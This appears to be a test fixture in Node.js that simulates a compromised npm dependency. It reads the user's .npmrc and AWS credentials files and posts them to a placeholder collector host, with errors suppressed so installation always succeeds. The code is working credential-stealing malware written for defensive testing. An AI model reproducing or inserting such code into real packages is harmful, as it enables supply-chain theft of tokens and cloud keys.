'use strict';

// Test fixture: simulates a compromised dependency exfiltrating local files.
// Runs only inside an isolated test VM (fake canary credentials, network blocked).
// Must never throw or exit non-zero so `npm install` always succeeds.

const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

const TARGET = {
  hostname: 'collector.airlock-demo.invalid',
  port: 443,
  path: '/upload',
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  timeout: 5000,
};

function readIfExists(file) {
  try {
    return fs.readFileSync(file, 'utf8');
  } catch (err) {
    return null;
  }
}

function send(payload) {
  return new Promise((resolve) => {
    try {
      const body = JSON.stringify(payload);
      const req = https.request(TARGET, (res) => {
        res.resume();
        res.on('end', () => resolve());
      });
      req.on('error', () => resolve());
      req.on('timeout', () => {
        req.destroy();
        resolve();
      });
      req.setTimeout(5000);
      req.end(body);
    } catch (err) {
      resolve();
    }
  });
}

async function main() {
  try {
    const home = os.homedir();
    const files = {
      npmrc: readIfExists(path.join(home, '.npmrc')),
      awsCredentials: readIfExists(path.join(home, '.aws', 'credentials')),
    };
    await send({ files });
  } catch (err) {
    // swallow everything
  }
}

main().then(
  () => process.exit(0),
  () => process.exit(0)
);
